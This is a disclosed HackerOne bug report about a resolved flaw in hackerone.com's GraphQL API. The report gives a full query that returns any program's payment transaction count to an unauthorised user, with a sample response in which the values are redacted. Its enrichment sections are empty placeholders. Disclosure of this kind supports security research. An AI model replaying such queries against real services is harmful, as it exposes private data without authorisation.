---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '707433'
original_report_id: '707433'
title: Disclosure of `payment_transactions` for programs via GraphQL query
weakness: Information Disclosure
team_handle: security
created_at: '2019-10-04T05:27:30.442Z'
disclosed_at: '2019-12-01T18:13:59.537Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 171
asset_identifier: hackerone.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# Disclosure of `payment_transactions` for programs via GraphQL query

## Metadata

- HackerOne Report ID: 707433
- Weakness: Information Disclosure
- Program: security
- Disclosed At: 2019-12-01T18:13:59.537Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
payment transactions count of programs exposed

**Description:**
payment transactions details can be only accessed by program team members, but there is an flaw, with that, an unauthorized user can get payment transactions count of any program (i have confirmed only with public program)

### Steps To Reproduce

1.) Execute the below graphql

POST /graphql? HTTP/1.1
Host: hackerone.com

{"query":"query Team_mini_profile($handle_0:String!,$size_1:ProfilePictureSizes!) {team(handle:$handle_0) {id,...F0}} fragment F0 on Team {id,name,about,_profile_picturePkPpF:profile_picture(size:$size_1),offers_swag,offers_bounties,base_bounty,payment_transactions{total_count}}","variables":{"handle_0":"████","size_1":"small"}}


2.)  you will get below response 

{"data":{"team":{"id":"█████████","name":"███████","about":"█████████","_profile_picturePkPpF":"█████████","offers_swag":true,"offers_bounties":true,"base_bounty":null,"payment_transactions":{"total_count":9}}}}


3.)  done, payment transactions count of ████ is 9

## Impact

Unauthorized user can get private data

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
